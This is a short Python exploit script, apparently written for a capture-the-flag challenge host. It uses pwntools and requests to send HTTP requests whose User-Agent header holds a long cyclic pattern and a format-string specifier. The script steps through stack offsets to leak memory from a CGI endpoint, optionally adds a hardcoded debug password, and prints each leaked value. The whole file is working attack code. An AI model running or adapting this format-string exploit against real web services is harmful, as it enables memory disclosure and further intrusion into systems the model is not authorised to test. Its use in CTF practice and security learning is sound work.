from pwn import *
import requests
import sys

url = "https://nessus-braggart.chals.io/sec.cgi"

password = "xbYP3h7Ua94c" # This was added after fuzzing 

with_pass = sys.argv[4]



for i in range(int(sys.argv[1]),int(sys.argv[2])):
    index = bytes(str(i),'utf-8')
    if with_pass == '1':
        header = {"User-Agent":cyclic(1008)+b"%"+index+b"$"+bytes(sys.argv[3],'utf-8'),"X-DEBUG":"1","X-PASSWORD":password}
    else:
        header = {"User-Agent":cyclic(1008)+b"%"+index+b"$"+bytes(sys.argv[3],'utf-8'),"X-DEBUG":"1"}
    r = requests.get(url, headers=header)
    if "Internal Server Error" in r.text:
        log.info("Fail to read offset")
        continue
    res = r.text.split("User Agent : </h3>")[1].split("</pre>")[0]
    print("{} -> {}".format(str(i),res))

